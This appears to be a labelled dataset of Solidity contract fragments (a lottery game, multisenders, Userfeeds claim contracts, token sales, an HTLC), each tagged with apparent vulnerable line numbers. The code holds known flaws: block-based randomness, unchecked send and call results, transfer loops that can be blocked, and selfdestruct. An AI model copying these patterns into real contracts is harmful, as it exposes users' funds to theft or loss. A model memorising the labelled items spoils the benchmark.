        return result;
    }
    function revoke()
        public
        onlyAdministrator
        activeGame
    {
        for (uint24 i = 0; i < ticketIndex.length; i++) {
            ticketIndex[i].transfer(bet);
        }
        state = State.REVOKED;
    }
}
contract UnilotTailEther is BaseUnilotGame {
    uint64 winnerIndex;
    //Public methods
    function UnilotTailEther(uint betAmount, address calculatorContractAddress)
        public
    {
        state = State.ACTIVE;
        administrator = msg.sender;
        bet = betAmount;
        calculator = UnilotPrizeCalculator(calculatorContractAddress);
        GameStarted(betAmount);
    }
    function getWinners()
        public
        view
        finishedGame
        returns(address[] memory players, uint[] memory prizes)
    {
        var(numWinners, numFixedAmountWinners) = getNumWinners();
        uint totalNumWinners = numWinners + numFixedAmountWinners;
        players = new address[](totalNumWinners);
        prizes = new uint[](totalNumWinners);
        uint index;
        for (uint i = 0; i < totalNumWinners; i++) {
            if ( i > winnerIndex ) {
                index = ( ( players.length ) - ( i - winnerIndex ) );
            } else {
                index = ( winnerIndex - i );
            }
            players[i] = ticketIndex[index];
            prizes[i] = tickets[players[i]].prize;
        }
        return (players, prizes);
    }
    function ()
        public
        payable
        validBet
        onlyPlayer
    {
        require(tickets[msg.sender].block_number == 0);
        require(ticketIndex.length <= 1000);
        tickets[msg.sender].block_number = uint40(block.number);
        tickets[msg.sender].block_time   = uint32(block.timestamp);
        ticketIndex.push(msg.sender);
        NewPlayerAdded(ticketIndex.length, getPrizeAmount());
    }
    function finish()
        public
        onlyAdministrator
        activeGame
    {
        uint64 max_votes;
        uint64[] memory num_votes = new uint64[](ticketIndex.length);
        for (uint i = 0; i < ticketIndex.length; i++) {
            TicketLib.Ticket memory ticket = tickets[ticketIndex[i]];
            uint64 vote = uint64( ( ( ticket.block_number * ticket.block_time ) + uint( ticketIndex[i]) ) % ticketIndex.length );
            num_votes[vote] += 1;
            if ( num_votes[vote] > max_votes ) {
                max_votes = num_votes[vote];",[64]
"    {
        uint totalAmount = this.balance;
        if ( state == State.ENDED ) {
            totalAmount = bet * ticketIndex.length;
        }
        result = calculator.getPrizeAmount(totalAmount);
        return result;
    }
    function getStat()
        public
        constant
        returns ( uint, uint, uint )
    {
        var (numWinners, numFixedAmountWinners) = getNumWinners();
        return (ticketIndex.length, getPrizeAmount(), uint(numWinners + numFixedAmountWinners));
    }
    function calcaultePrizes()
        public
        returns(uint[] memory result)
    {
        var(numWinners, numFixedAmountWinners) = getNumWinners();
        uint totalNumWinners = ( numWinners + numFixedAmountWinners );
        result = new uint[]( totalNumWinners );
        uint[50] memory prizes = calculator.calcaultePrizes(
        bet, ticketIndex.length);
        for (uint i = 0; i < totalNumWinners; i++) {
            result[i] = prizes[i];
        }
        return result;
    }
    function revoke()
        public
        onlyAdministrator
        activeGame
    {
        for (uint i = 0; i < ticketIndex.length; i++) {
            tickets[ticketIndex[i]].is_active = false;
            ticketIndex[i].transfer(bet);
        }
        state = State.REVOKED;
    }
}
contract UnilotTailEther is BaseUnilotGame {
    uint winnerIndex;
    //Public methods
    function UnilotTailEther(uint betAmount, address calculatorContractAddress)
        public
    {
        state = State.ACTIVE;
        administrator = msg.sender;
        bet = betAmount;
        calculator = UnilotPrizeCalculator(calculatorContractAddress);
        GameStarted(betAmount);
    }
    function play()
        public
        payable
        validBet
        onlyPlayer
    {
        require(tickets[msg.sender].block_number == 0);
        require(ticketIndex.length < 200);
        tickets[msg.sender].is_winner    = false;
        tickets[msg.sender].is_active    = true;
        tickets[msg.sender].block_number = block.number;
        tickets[msg.sender].block_time   = block.timestamp;
        tickets[msg.sender].num_votes    = 0;
        ticketIndex.push(msg.sender);
        NewPlayerAdded(ticketIndex.length, getPrizeAmount());
    }
    function finish()
        public
        onlyAdministrator
        activeGame
    {
        uint max_votes;
        for (uint i = 0; i < ticketIndex.length; i++) {
            TicketLib.Ticket memory ticket = tickets[ticketIndex[i]];
            uint vote = ( ( ticket.block_number * ticket.block_time ) + uint(ticketIndex[i]) ) % ticketIndex.length;
            tickets[ticketIndex[vote]].num_votes += 1;
            uint ticketNumVotes = tickets[ticketIndex[vote]].num_votes;
            if ( ticketNumVotes > max_votes ) {
                max_votes = ticketNumVotes;
                winnerIndex = vote;
            }
        }
        uint[] memory prizes = calcaultePrizes();
        uint lastId = winnerIndex;
        for ( i = 0; i < prizes.length; i++ ) {
            if (tickets[ticketIndex[lastId]].is_active) {
                tickets[ticketIndex[lastId]].prize = prizes[i];
                tickets[ticketIndex[lastId]].is_winner = true;
                ticketIndex[lastId].transfer(prizes[i]);
            } else {
                i--;
            }
            if ( lastId <= 0 ) {
                lastId = ticketIndex.length;
            }
            lastId -= 1;
        }
        administrator.transfer(this.balance);
        state = State.ENDED;
        GameFinished(ticketIndex[winnerIndex]);
    }
}","[36, 38, 89, 93]"
"            return;
        }
        /// @dev Logic for tokens
        ERC20 token = ERC20(_token);
        balance = token.balanceOf(this);
        require(token.transfer(escapeHatchDestination, balance));
        EscapeHatchCalled(_token, balance);
    }
    /// @notice Changes the address assigned to call `escapeHatch()`
    /// @param _newEscapeHatchCaller The address of a trusted account or
    ///  contract to call `escapeHatch()` to send the value in this contract to
    ///  the `escapeHatchDestination`; it would be ideal that `escapeHatchCaller`
    ///  cannot move funds out of `escapeHatchDestination`
    function changeHatchEscapeCaller(address _newEscapeHatchCaller) public onlyEscapeHatchCallerOrOwner {
        escapeHatchCaller = _newEscapeHatchCaller;
    }
    event EscapeHatchBlackistedToken(address token);
    event EscapeHatchCalled(address token, uint amount);
}
// TightlyPacked is cheaper if you need to store input data and if amount is less than 12 bytes.
// Normal is cheaper if you don't need to store input data or if amounts are greater than 12 bytes.
contract UnsafeMultiplexor is Escapable(0, 0) {
    function init(address _escapeHatchCaller, address _escapeHatchDestination) public {
        require(escapeHatchCaller == 0);
        require(_escapeHatchCaller != 0);
        require(_escapeHatchDestination != 0);
        escapeHatchCaller = _escapeHatchCaller;
        escapeHatchDestination = _escapeHatchDestination;
    }
    modifier sendBackLeftEther() {
        uint balanceBefore = this.balance - msg.value;
        _;
        uint leftovers = this.balance - balanceBefore;
        if (leftovers > 0) {
            msg.sender.transfer(leftovers);
        }
    }
    function multiTransferTightlyPacked(bytes32[] _addressAndAmount) sendBackLeftEther() payable public returns(bool) {
        for (uint i = 0; i < _addressAndAmount.length; i++) {
            _unsafeTransfer(address(_addressAndAmount[i] >> 96), uint(uint96(_addressAndAmount[i])));
        }
        return true;
    }
    function multiTransfer(address[] _address, uint[] _amount) sendBackLeftEther() payable public returns(bool) {
        for (uint i = 0; i < _address.length; i++) {
            _unsafeTransfer(_address[i], _amount[i]);
        }
        return true;
    }
    function multiCallTightlyPacked(bytes32[] _addressAndAmount) sendBackLeftEther() payable public returns(bool) {
        for (uint i = 0; i < _addressAndAmount.length; i++) {
            _unsafeCall(address(_addressAndAmount[i] >> 96), uint(uint96(_addressAndAmount[i])));
        }
        return true;
    }
    function multiCall(address[] _address, uint[] _amount) sendBackLeftEther() payable public returns(bool) {
        for (uint i = 0; i < _address.length; i++) {
            _unsafeCall(_address[i], _amount[i]);
        }
        return true;
    }
    function _unsafeTransfer(address _to, uint _amount) internal {
        require(_to != 0);
        _to.send(_amount);
    }
    function _unsafeCall(address _to, uint _amount) internal {
        require(_to != 0);
        _to.call.value(_amount)();
    }
}",[64]
"        return boolStorage[keccak256(""rs_multisender_initialized"")];
    }
    function txCount(address customer) public view returns(uint256) {
        return uintStorage[keccak256(abi.encodePacked(""txCount"", customer))];
    }
    function arrayLimit() public view returns(uint256) {
        return uintStorage[keccak256(abi.encodePacked(""arrayLimit""))];
    }
    function setArrayLimit(uint256 _newLimit) public onlyOwner {
        require(_newLimit != 0);
        uintStorage[keccak256(""arrayLimit"")] = _newLimit;
    }
    function discountStep() public view returns(uint256) {
        return uintStorage[keccak256(""discountStep"")];
    }
    function setDiscountStep(uint256 _newStep) public onlyOwner {
        require(_newStep != 0);
        uintStorage[keccak256(""discountStep"")] = _newStep;
    }
    function fee() public view returns(uint256) {
        return uintStorage[keccak256(""fee"")];
    }
    function currentFee(address _customer) public view returns(uint256) {
        if (fee() > discountRate(msg.sender)) {
            return fee().sub(discountRate(_customer));
        } else {
            return 0;
        }
    }
    function setFee(uint256 _newStep) public onlyOwner {
        require(_newStep != 0);
        uintStorage[keccak256(""fee"")] = _newStep;
    }
    function discountRate(address _customer) public view returns(uint256) {
        uint256 count = txCount(_customer);
        return count.mul(discountStep());
    }
    function multisendToken(address token, address[] _contributors, uint256[] _balances) public hasFee payable {
        if (token == 0x000000000000000000000000000000000000bEEF){
            multisendEther(_contributors, _balances);
        } else {
            uint256 total = 0;
            require(_contributors.length <= arrayLimit());
            ERC20 erc20token = ERC20(token);
            uint8 i = 0;
            for (i; i < _contributors.length; i++) {
                erc20token.transferFrom(msg.sender, _contributors[i], _balances[i]);
                total += _balances[i];
            }
            setTxCount(msg.sender, txCount(msg.sender).add(1));
            emit Multisended(total, token);
        }
    }
    function multisendEther(address[] _contributors, uint256[] _balances) public payable {
        uint256 total = msg.value;
        uint256 userfee = currentFee(msg.sender);
        require(total >= userfee);
        require(_contributors.length <= arrayLimit());
        total = total.sub(userfee);
        uint256 i = 0;
        for (i; i < _contributors.length; i++) {
            require(total >= _balances[i]);
            total = total.sub(_balances[i]);
            _contributors[i].transfer(_balances[i]);
        }
        setTxCount(msg.sender, txCount(msg.sender).add(1));
        emit Multisended(msg.value, 0x000000000000000000000000000000000000bEEF);
    }
    function claimTokens(address _token) public onlyOwner {
        if (_token == 0x0) {
            owner().transfer(address(this).balance);
            return;
        }
        ERC20 erc20token = ERC20(_token);
        uint256 balance = erc20token.balanceOf(this);
        erc20token.transfer(owner(), balance);
        emit ClaimedTokens(_token, owner(), balance);
    }
    function setTxCount(address customer, uint256 _txCount) private {
        uintStorage[keccak256(abi.encodePacked(""txCount"", customer))] = _txCount;
    }
}",[64]
"    }
    function initialized() public view returns (bool) {
        return boolStorage[keccak256(""rs_multisender_initialized"")];
    }
    function txCount(address customer) public view returns(uint256) {
        return uintStorage[keccak256(abi.encodePacked(""txCount"", customer))];
    }
    function arrayLimit() public view returns(uint256) {
        return uintStorage[keccak256(abi.encodePacked(""arrayLimit""))];
    }
    function setArrayLimit(uint256 _newLimit) public onlyOwner {
        require(_newLimit != 0);
        uintStorage[keccak256(""arrayLimit"")] = _newLimit;
    }
    function discountStep() public view returns(uint256) {
        return uintStorage[keccak256(""discountStep"")];
    }
    function setDiscountStep(uint256 _newStep) public onlyOwner {
        require(_newStep != 0);
        uintStorage[keccak256(""discountStep"")] = _newStep;
    }
    function fee() public view returns(uint256) {
        return uintStorage[keccak256(""fee"")];
    }
    function currentFee(address _customer) public view returns(uint256) {
        if (fee() > discountRate(msg.sender)) {
            return fee().sub(discountRate(_customer));
        } else {
            return 0;
        }
    }
    function setFee(uint256 _newStep) public onlyOwner {
        require(_newStep != 0);
        uintStorage[keccak256(""fee"")] = _newStep;
    }
    function discountRate(address _customer) public view returns(uint256) {
        uint256 count = txCount(_customer);
        return count.mul(discountStep());
    }
    function multisendToken(address token, address[] _contributors, uint256[] _balances) public hasFee payable {
        if (token == 0x000000000000000000000000000000000000bEEF){
            multisendEther(_contributors, _balances);
        } else {
            uint256 total = 0;
            require(_contributors.length <= arrayLimit());
            ERC20 erc20token = ERC20(token);
            uint8 i = 0;
            for (i; i < _contributors.length; i++) {
                erc20token.transferFrom(msg.sender, _contributors[i], _balances[i]);
                total += _balances[i];
            }
            setTxCount(msg.sender, txCount(msg.sender).add(1));
            emit Multisended(total, token);
        }
    }
    function multisendEther(address[] _contributors, uint256[] _balances) public payable {
        uint256 total = msg.value;
        uint256 userfee = currentFee(msg.sender);
        require(total >= userfee);
        require(_contributors.length <= arrayLimit());
        total = total.sub(userfee);
        uint256 i = 0;
        for (i; i < _contributors.length; i++) {
            require(total >= _balances[i]);
            total = total.sub(_balances[i]);
            _contributors[i].transfer(_balances[i]);
        }
        setTxCount(msg.sender, txCount(msg.sender).add(1));
        emit Multisended(msg.value, 0x000000000000000000000000000000000000bEEF);
    }
    function claimTokens(address _token) public onlyOwner {
        if (_token == 0x0) {
            owner().transfer(address(this).balance);
            return;
        }
        ERC20 erc20token = ERC20(_token);
        uint256 balance = erc20token.balanceOf(this);
        erc20token.transfer(owner(), balance);
        emit ClaimedTokens(_token, owner(), balance);
    }
    function setTxCount(address customer, uint256 _txCount) private {
        uintStorage[keccak256(abi.encodePacked(""txCount"", customer))] = _txCount;
    }
}","[63, 66]"
"}
// older version:
// Mainnet: 0x70B610F7072E742d4278eC55C02426Dbaaee388C
// Rinkeby: 0x00034B8397d9400117b4298548EAa59267953F8c
// Ropsten: 0x37C1CA7996CDdAaa31e13AA3eEE0C89Ee4f665B5
// Kovan:   0xc666c75C2bBA9AD8Df402138cE32265ac0EC7aaC
contract UserfeedsClaimWithValueTransfer is Destructible, WithClaim {
  function post(address userfeed, string data) public payable {
    emit Claim(data);
    userfeed.transfer(msg.value);
  }
}
// older version:
// Mainnet: 0xfF8A1BA752fE5df494B02D77525EC6Fa76cecb93
// Rinkeby: 0xBd2A0FF74dE98cFDDe4653c610E0E473137534fB
// Ropsten: 0x54b4372fA0bd76664B48625f0e8c899Ff19DFc39
// Kovan:   0xd6Ede7F43882B100C6311a9dF801088eA91cEb64
contract UserfeedsClaimWithTokenTransfer is Destructible, WithClaim {
  function post(address userfeed, ERC20 token, uint value, string data) public {
    emit Claim(data);
    require(token.transferFrom(msg.sender, userfeed, value));
  }
}
// Rinkeby: 0x73cDd7e5Cf3DA3985f985298597D404A90878BD9
// Ropsten: 0xA7828A4369B3e89C02234c9c05d12516dbb154BC
// Kovan:   0x5301F5b1Af6f00A61E3a78A9609d1D143B22BB8d
contract UserfeedsClaimWithValueMultiSendUnsafe is Destructible, WithClaim {
  function post(string data, address[] recipients) public payable {
    emit Claim(data);
    send(recipients);
  }
  function post(string data, bytes20[] recipients) public payable {
    emit Claim(data);
    send(recipients);
  }
  function send(address[] recipients) public payable {
    uint amount = msg.value / recipients.length;
    for (uint i = 0; i < recipients.length; i++) {
      recipients[i].send(amount);
    }
    msg.sender.transfer(address(this).balance);
  }
  function send(bytes20[] recipients) public payable {
    uint amount = msg.value / recipients.length;
    for (uint i = 0; i < recipients.length; i++) {
      address(recipients[i]).send(amount);
    }
    msg.sender.transfer(address(this).balance);
  }
}
// Mainnet: 0xfad31a5672fBd8243E9691E8a5F958699CD0AaA9
// Rinkeby: 0x1f8A01833A0B083CCcd87fffEe50EF1D35621fD2
// Ropsten: 0x298611B2798d280910274C222A9dbDfBA914B058
// Kovan:   0x0c20Daa719Cd4fD73eAf23d2Cb687cD07d500E17
contract UserfeedsClaimWithConfigurableValueMultiTransfer is Destructible, WithClaim {
  function post(string data, address[] recipients, uint[] values) public payable {
    emit Claim(data);
    transfer(recipients, values);
  }
  function transfer(address[] recipients, uint[] values) public payable {
    for (uint i = 0; i < recipients.length; i++) {
      recipients[i].transfer(values[i]);
    }
    msg.sender.transfer(address(this).balance);
  }
}
// Mainnet: 0xeCBED48098C4F25a16195c45DdF5fD736E28B14b
// Rinkeby: 0xA105908d1Bd7e76Ec4Dfddd08d9E0c89F6B39474
// Ropsten: 0x1A97Aba0fb047cd8cd8F4c14D890bE6E7004fae9
// Kovan:   0xcF53D90E7f71C7Db557Bc42C5a85D36dD53956C0
contract UserfeedsClaimWithConfigurableTokenMultiTransfer is Destructible, WithClaim {
  function post(string data, address[] recipients, ERC20 token, uint[] values) public {
    emit Claim(data);
    transfer(recipients, token, values);
  }
  function transfer(address[] recipients, ERC20 token, uint[] values) public {
    for (uint i = 0; i < recipients.length; i++) {
      require(token.transferFrom(msg.sender, recipients[i], values[i]));
    }
  }
}
// Rinkeby: 0x042a52f30572A54f504102cc1Fbd1f2B53859D8A
// Ropsten: 0x616c0ee7C6659a99a99A36f558b318779C3ebC16
// Kovan:   0x30192DE195f393688ce515489E4E0e0b148e9D8d
contract UserfeedsClaimWithConfigurableTokenMultiTransferNoCheck is Destructible, WithClaim {
  function post(string data, address[] recipients, ERC721 token, uint[] values) public {
    emit Claim(data);
    transfer(recipients, token, values);
  }
  function transfer(address[] recipients, ERC721 token, uint[] values) public {
    for (uint i = 0; i < recipients.length; i++) {
      token.transferFrom(msg.sender, recipients[i], values[i]);
    }
  }
}","[37, 39, 44, 62, 78, 92]"
"}
contract WithClaim {
  event Claim(string data);
}
// older version:
// Mainnet: 0xFd74f0ce337fC692B8c124c094c1386A14ec7901
// Rinkeby: 0xC5De286677AC4f371dc791022218b1c13B72DbBd
// Ropsten: 0x6f32a6F579CFEed1FFfDc562231C957ECC894001
// Kovan:   0x139d658eD55b78e783DbE9bD4eb8F2b977b24153
contract UserfeedsClaimWithoutValueTransfer is Destructible, WithClaim {
  function post(string data) public {
    emit Claim(data);
  }
}
// older version:
// Mainnet: 0x70B610F7072E742d4278eC55C02426Dbaaee388C
// Rinkeby: 0x00034B8397d9400117b4298548EAa59267953F8c
// Ropsten: 0x37C1CA7996CDdAaa31e13AA3eEE0C89Ee4f665B5
// Kovan:   0xc666c75C2bBA9AD8Df402138cE32265ac0EC7aaC
contract UserfeedsClaimWithValueTransfer is Destructible, WithClaim {
  function post(address userfeed, string data) public payable {
    emit Claim(data);
    userfeed.transfer(msg.value);
  }
}
// older version:
// Mainnet: 0xfF8A1BA752fE5df494B02D77525EC6Fa76cecb93
// Rinkeby: 0xBd2A0FF74dE98cFDDe4653c610E0E473137534fB
// Ropsten: 0x54b4372fA0bd76664B48625f0e8c899Ff19DFc39
// Kovan:   0xd6Ede7F43882B100C6311a9dF801088eA91cEb64
contract UserfeedsClaimWithTokenTransfer is Destructible, WithClaim {
  function post(address userfeed, ERC20 token, uint value, string data) public {
    emit Claim(data);
    require(token.transferFrom(msg.sender, userfeed, value));
  }
}
// Rinkeby: 0x73cDd7e5Cf3DA3985f985298597D404A90878BD9
// Ropsten: 0xA7828A4369B3e89C02234c9c05d12516dbb154BC
// Kovan:   0x5301F5b1Af6f00A61E3a78A9609d1D143B22BB8d
contract UserfeedsClaimWithValueMultiSendUnsafe is Destructible, WithClaim {
  function post(string data, address[] recipients) public payable {
    emit Claim(data);
    send(recipients);
  }
  function post(string data, bytes20[] recipients) public payable {
    emit Claim(data);
    send(recipients);
  }
  function send(address[] recipients) public payable {
    uint amount = msg.value / recipients.length;
    for (uint i = 0; i < recipients.length; i++) {
      recipients[i].send(amount);
    }
    msg.sender.transfer(address(this).balance);
  }
  function send(bytes20[] recipients) public payable {
    uint amount = msg.value / recipients.length;
    for (uint i = 0; i < recipients.length; i++) {
      address(recipients[i]).send(amount);
    }
    msg.sender.transfer(address(this).balance);
  }
}
// Mainnet: 0xfad31a5672fbd8243e9691e8a5f958699cd0aaa9
// Rinkeby: 0x1f8A01833A0B083CCcd87fffEe50EF1D35621fD2
// Ropsten: 0x298611B2798d280910274C222A9dbDfBA914B058
// Kovan:   0x0c20Daa719Cd4fD73eAf23d2Cb687cD07d500E17
contract UserfeedsClaimWithConfigurableValueMultiTransfer is Destructible, WithClaim {
  function post(string data, address[] recipients, uint[] values) public payable {
    emit Claim(data);
    transfer(recipients, values);
  }
  function transfer(address[] recipients, uint[] values) public payable {
    for (uint i = 0; i < recipients.length; i++) {
      recipients[i].transfer(values[i]);
    }
    msg.sender.transfer(address(this).balance);
  }
}
// Rinkeby: 0xA105908d1Bd7e76Ec4Dfddd08d9E0c89F6B39474
// Ropsten: 0x1A97Aba0fb047cd8cd8F4c14D890bE6E7004fae9
// Kovan:   0xcF53D90E7f71C7Db557Bc42C5a85D36dD53956C0
contract UserfeedsClaimWithConfigurableTokenMultiTransfer is Destructible, WithClaim {
  function post(string data, address[] recipients, ERC20 token, uint[] values) public {
    emit Claim(data);
    transfer(recipients, token, values);
  }
  function transfer(address[] recipients, ERC20 token, uint[] values) public {
    for (uint i = 0; i < recipients.length; i++) {
      require(token.transferFrom(msg.sender, recipients[i], values[i]));
    }
  }
}
// Rinkeby: 0x042a52f30572A54f504102cc1Fbd1f2B53859D8A
// Ropsten: 0x616c0ee7C6659a99a99A36f558b318779C3ebC16
// Kovan:   0x30192DE195f393688ce515489E4E0e0b148e9D8d
contract UserfeedsClaimWithConfigurableTokenMultiTransferNoCheck is Destructible, WithClaim {
  function post(string data, address[] recipients, ERC721 token, uint[] values) public {
    emit Claim(data);
    transfer(recipients, token, values);
  }
  function transfer(address[] recipients, ERC721 token, uint[] values) public {
    for (uint i = 0; i < recipients.length; i++) {
      token.transferFrom(msg.sender, recipients[i], values[i]);
    }
  }
}","[52, 57, 74, 75, 76, 77]"
"        return true;
    }
    function validTransfer(uint _value)
        pure private
        returns (bool)
    {
        if (_value == 0)
            return false;
        return true;
    }
    function ()
        public
        payable
    {
        buy();
    }
    function buy()
        public
        payable
        validEth        // 以太是否在允许范围
        validPeriod     // 是否在ICO期间
        validQuantity   // 代币是否已卖完
        validStatue     // 售卖是否已经主动结束
    {
        uint eth = msg.value;
        // 计算代币数量
        uint quantity = eth * price / 10 ** 10;
        // 是否超出剩余代币
        uint leftQuantity = safeSub(valueSale, saleQuantity);
        if (quantity > leftQuantity) {
            quantity = leftQuantity;
        }
        saleQuantity = safeAdd(saleQuantity, quantity);
        ethQuantity = safeAdd(ethQuantity, eth);
        // 发送代币
        require(transferInner(msg.sender, quantity));
        // 生成日志
        Buy(msg.sender, eth, quantity);
    }
    function stopSale()
        public
        onlyOwner
        returns (bool)
    {
        assert(!saleStopped);
        saleStopped = true;
        StopSale();
        return true;
    }
    function getPeriod()
        public
        constant
        returns (uint)
    {
        if (saleStopped) {
            return FINISHED;
        }
        if (now < openTime) {
            return BEFORE_SALE;
        }
        if (valueSale == saleQuantity) {
            return FINISHED;
        }
        if (now >= openTime && now < closeTime) {
            return IN_SALE;
        }
        return FINISHED;
    }
    //从合约提Eth
    function withdraw(uint amount)
        public
        onlyOwner
    {
        uint period = getPeriod();
        require(period == FINISHED);
        require(this.balance >= amount);
        msg.sender.transfer(amount);
    }
    // 从合约提token 一定要公募结束才可以提
    function withdrawToken(uint amount)
        public
        onlyOwner
    {
        uint period = getPeriod();
        require(period == FINISHED);
        withdrawQuantity += safeAdd(withdrawQuantity, amount);
        require(transferInner(msg.sender, amount));
    }
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
    event Buy(address indexed sender, uint eth, uint token);
    event StopSale();
}",[64]
" */
contract BurnableToken is BasicToken {
    event Burn(address indexed burner, uint256 value);
    /**
     * @dev Burns a specific amount of tokens.
     * @param _value The amount of token to be burned.
     */
    function burn(uint256 _value) public {
        require(_value <= balances[msg.sender]);
        // no need to require value <= totalSupply, since that would imply the
        // sender's balance is greater than the totalSupply, which *should* be an assertion failure
        address burner = msg.sender;
        balances[burner] = balances[burner].sub(_value);
        totalSupply = totalSupply.sub(_value);
        Burn(burner, _value);
    }
}
/**
 * @title SafeERC20
 * @dev Wrappers around ERC20 operations that throw on failure.
 * To use this library you can add a `using SafeERC20 for ERC20;` statement to your contract,
 * which allows you to call the safe operations as `token.safeTransfer(...)`, etc.
 */
library SafeERC20 {
  function safeTransfer(ERC20Basic token, address to, uint256 value) internal {
    assert(token.transfer(to, value));
  }
  function safeTransferFrom(ERC20 token, address from, address to, uint256 value) internal {
    assert(token.transferFrom(from, to, value));
  }
  function safeApprove(ERC20 token, address spender, uint256 value) internal {
    assert(token.approve(spender, value));
  }
}
//it mimic the TokenTimelock
contract HTLC {
    using SafeERC20 for ERC20Basic;
    // ERC20 basic token contract being held
    ERC20Basic public token;
    // beneficiary of tokens being released by hashing
    address public beneficiary;
    // timestamp when lock is timeout
    uint256 public releaseTime;
    // sha256 hash to release
    bytes32 sha256hash;
    function HTLC(ERC20Basic _token, bytes32 _hash, address _beneficiary, uint256 _releaseTime) public {
        require(_releaseTime > now);
        token = _token;
        beneficiary = _beneficiary;
        releaseTime = _releaseTime;
        sha256hash = _hash;
    }
    /**
     * @notice Transfer to the specified address if anyone can provide the correct preimage.
     */
    function redeem(bytes preimage) public {
        require(sha256(preimage) == sha256hash);
        uint256 amount = token.balanceOf(this);
        require(amount > 0);
        token.safeTransfer(beneficiary, amount);
        selfdestruct(msg.sender);
    }
    /**
     * @notice Default action when timeout: override this.
     */
    function onTimeout(uint256) internal {
        selfdestruct(msg.sender);
    }
    /**
     * @notice When timeout. for default action, the token in it will lost forever
     */
    function release() public {
        require(now >= releaseTime);
        uint256 amount = token.balanceOf(this);
        require(amount > 0);
        onTimeout(amount);
    }
}
contract VCBToken is CappedToken, BurnableToken, DetailedERC20 {
    using SafeMath for uint256;
    uint8 constant DECIMALS = 18;
    uint  constant TOTALTOKEN = 1 * 10 ** (8 + uint(DECIMALS));
    string constant NAME = ""ValueCyber Token"";
    string constant SYM = ""VCT"";
    address constant PRESALE = 0x638a3C7dF9D1B3A56E19B92bE07eCC84b6475BD6;
    uint  constant PRESALETOKEN = 55 * 10 ** (6 + uint(DECIMALS));
    function VCBToken() CappedToken(TOTALTOKEN) DetailedERC20 (NAME, SYM, DECIMALS) public {
        balances[PRESALE] = PRESALETOKEN;
        totalSupply = totalSupply.add(PRESALETOKEN);
    }
}
contract VCBCrowdSale is Crowdsale, Ownable {
    using SafeMath for uint256;
    uint  constant RATIO = 800;
    uint8 constant RATIODENO = 100;
    uint constant SALELASTFOR = 50 days;
    address constant FUNDWALLET = 0x622969e0928fa6bEeda9f26F8a60D0b22Db7E6f1;
    mapping(address => uint8) giftList;
    event CrowdsaleFinalized();
    /**
    * event for token gift logging
    * @param beneficiary who got the gifted tokens
    * @param amount amount of tokens gifted
    */
    event TokenGift(address indexed beneficiary, uint256 amount);
    function VCBCrowdSale() Crowdsale(now, now + SALELASTFOR, RATIO, FUNDWALLET) public {
    }
    function createTokenContract() internal returns (MintableToken) {
        return new VCBToken();
    }
    //our crowdsale can stop at anytime, and then the totally crowsale contract is disappear
    function finalize(address _finaladdr) onlyOwner public {
        token.finishMinting();
        CrowdsaleFinalized();
        address finaladdr = FUNDWALLET;
        if (_finaladdr != address(0)) {
            finaladdr = _finaladdr;
        }
        selfdestruct(finaladdr);
    }
    function giftTokens(address beneficiary) internal {
        uint256 weiAmount = msg.value;
        // calculate token amount to be created
        uint256 gifttokens = weiAmount.mul(giftList[beneficiary]).mul(rate).div(RATIODENO);
        if (gifttokens > 0) {
            //if gift token can't be sent, contract still fails
            token.mint(beneficiary, gifttokens);
            TokenGift(beneficiary, gifttokens);","[56, 61, 66, 67, 72, 73]"
"        emit AdminshipUpdated(_newAdmin,_level); //Log the admin set
    }
    /**
    * @dev Log Events
    */
    event AdminshipUpdated(address _newAdmin, uint8 _level);
}
contract VSTERICO is admined {
    using SafeMath for uint256;
    //This ico have these possible states
    enum State {
        PRESALE,
        MAINSALE,
        Successful
    }
    //Public variables
    //Time-state Related
    State public state = State.PRESALE; //Set initial stage
    uint256 constant public PRESALEStart = 1548979200; //Human time (GMT): Friday, 1 February 2019 0:00:00
    uint256 constant public MAINSALEStart = 1554163200; //Human time (GMT): Tuesday, 2 April 2019 0:00:00
    uint256 constant public SaleDeadline = 1564531200; //Human time (GMT): Wednesday, 31 July 2019 0:00:00
    uint256 public completedAt; //Set when ico finish
    //Token-eth related
    uint256 public totalRaised; //eth collected in wei
    uint256 public totalRefDistributed; //total tokens distributed to referrals
    uint256 public totalEthRefDistributed; //total eth distributed to specified referrals
    uint256 public totalDistributed; //Sale tokens distributed
    ERC20Basic public tokenReward = ERC20Basic(0xA2e13c4f0431B6f2B06BBE61a24B61CCBe13136A); //Token contract address
    mapping(address => bool) referral; //Determine the referral type
    //Contract details
    address public creator; //Creator address
    address public fundsWallet = 0x62e0b52F0a7AD4bB7b87Ce41e132bCBC7173EB96;
    string public version = '0.2'; //Contract version
    //Price related
    uint256 public USDPriceInWei; // 0.1 cent (0.001$) in wei
    string public USDPrice;
    //events for log
    event LogFundrisingInitialized(address indexed _creator);
    event LogFundingReceived(address indexed _addr, uint _amount, uint _currentTotal, address _referral);
    event LogBeneficiaryPaid(address indexed _beneficiaryAddress);
    event LogContributorsPayout(address indexed _addr, uint _amount);
    event LogFundingSuccessful(uint _totalRaised);
    //Modifier to prevent execution if ico has ended or is holded
    modifier notFinished() {
        require(state != State.Successful);
        _;
    }
    /**
    * @notice ICO constructor
    * @param _initialUSDInWei initial usd value on wei
    */
    constructor(uint _initialUSDInWei) public {
        creator = msg.sender; //Creator is set from deployer address
        USDPriceInWei = _initialUSDInWei;
        emit LogFundrisingInitialized(creator); //Log contract initialization
    }
    function setReferralType(address _user, bool _type) onlyAdmin(1) public {
      referral[_user] = _type;
    }
    /**
    * @notice contribution handler
    */
    function contribute(address _target, uint256 _value, address _reff) public notFinished payable {
        require(now > PRESALEStart); //This time must be equal or greater than the start time
        address user;
        uint remaining;
        uint256 tokenBought;
        uint256 temp;
        uint256 refBase;
        //If the address is not zero the caller must be an admin
        if(_target != address(0) && level[msg.sender] >= 1){
          user = _target; //user is set by admin
          remaining = _value.mul(1e18); //value contributed is set by admin
          refBase = _value; //value for referral calc
        } else { //If the address is zero or the caller is not an admin
          user = msg.sender; //user is same as caller
          remaining = msg.value.mul(1e18); //value is same as sent
          refBase = msg.value; //value for referral calc
        }
        totalRaised = totalRaised.add(remaining.div(1e18)); //ether received updated
        //Tokens bought calculation
        while(remaining > 0){
          (temp,remaining) = tokenBuyCalc(remaining);
          tokenBought = tokenBought.add(temp);
        }
        temp = 0; //Clear temporal variable
        totalDistributed = totalDistributed.add(tokenBought); //Whole tokens sold updated
        //Check for presale limit
        if(state == State.PRESALE){
          require(totalDistributed <= 5000000 * (10**18));
        }
        //Transfer tokens to user
        tokenReward.transfer(user,tokenBought);
        //Referral checks
        if(_reff != address(0) && _reff != user){ //referral cannot be zero or self
